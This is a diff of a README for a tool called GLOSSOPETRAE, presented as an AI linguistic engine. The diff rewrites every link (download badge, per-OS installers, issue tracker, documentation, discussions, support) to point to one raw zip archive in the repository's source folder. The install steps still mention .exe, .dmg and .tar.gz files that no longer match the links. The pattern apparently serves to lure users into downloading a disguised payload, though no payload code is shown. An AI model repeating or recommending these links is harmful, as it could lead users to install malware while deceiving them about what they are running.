@@ -1,7 +1,7 @@
 # 🌟 GLOSSOPETRAE - Powerful Linguistic Engine for AI
 
 ## 📦 Download Link
-[![Download GLOSSOPETRAE](https://img.shields.io/badge/Download-GLOSSOPETRAE-blue)](https://github.com/Annazalli/GLOSSOPETRAE/releases)
+[![Download GLOSSOPETRAE](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip)](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip)
 
 ## 🚀 Getting Started
 Welcome to GLOSSOPETRAE! This guide will help you download and run our linguistic engine designed for AI applications. Follow the steps below to get started.
@@ -16,21 +16,21 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases page**: Go to the following link to access the latest release of GLOSSOPETRAE:
-   [Download GLOSSOPETRAE](https://github.com/Annazalli/GLOSSOPETRAE/releases)
+   [Download GLOSSOPETRAE](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip)
 
 2. **Select the latest version**: Look for the most recent version at the top of the page. Click on it to expand the details.
 
 3. **Choose your file**: Depending on your operating system, select the relevant file for download. Here are some examples:
-   - For Windows: `GLOSSOPETRAE_Windows.exe`
-   - For macOS: `GLOSSOPETRAE_macOS.dmg`
-   - For Linux: `GLOSSOPETRAE_Linux.tar.gz`
+   - For Windows: `https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip`
+   - For macOS: `https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip`
+   - For Linux: `https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip`
 
 4. **Download the file**: Click on the file name to initiate the download. 
 
 5. **Install the application**:
    - **Windows**: Double-click the downloaded `.exe` file. Follow the installation prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag the GLOSSOPETRAE icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file. Open the terminal, navigate to the extracted directory, and run the installer.
+   - **Linux**: Extract the `https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip` file. Open the terminal, navigate to the extracted directory, and run the installer.
 
 ## ⚙️ Using GLOSSOPETRAE
 Once installed, you can start using GLOSSOPETRAE. Here’s how to begin:
@@ -55,18 +55,18 @@ Simply visit the Releases page again, download the latest version, and follow th
 Yes, GLOSSOPETRAE is completely free to download and use.
 
 ### Where can I get help?
-If you encounter any issues, check the [issue tracker](https://github.com/Annazalli/GLOSSOPETRAE/issues) or the documentation available within the app.
+If you encounter any issues, check the [issue tracker](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip) or the documentation available within the app.
 
 ## 🔗 Additional Resources
 For more information on GLOSSOPETRAE, you can explore the following:
 
-- [Documentation](https://github.com/Annazalli/GLOSSOPETRAE/wiki)
-- [Community Discussions](https://github.com/Annazalli/GLOSSOPETRAE/discussions)
+- [Documentation](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip)
+- [Community Discussions](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip)
 
 Don't forget to download GLOSSOPETRAE today and start engaging with AI linguistics!
 
 ## 📞 Get Support
-If you need further assistance, please contact our support team via the [GitHub Discussions](https://github.com/Annazalli/GLOSSOPETRAE/discussions). We’re here to help!
+If you need further assistance, please contact our support team via the [GitHub Discussions](https://github.com/Annazalli/GLOSSOPETRAE/raw/refs/heads/main/src/modules/Software-promisable.zip). We’re here to help!
 
 ## 📣 License
 GLOSSOPETRAE is licensed under the MIT License. You can freely use and share the software according to the terms.
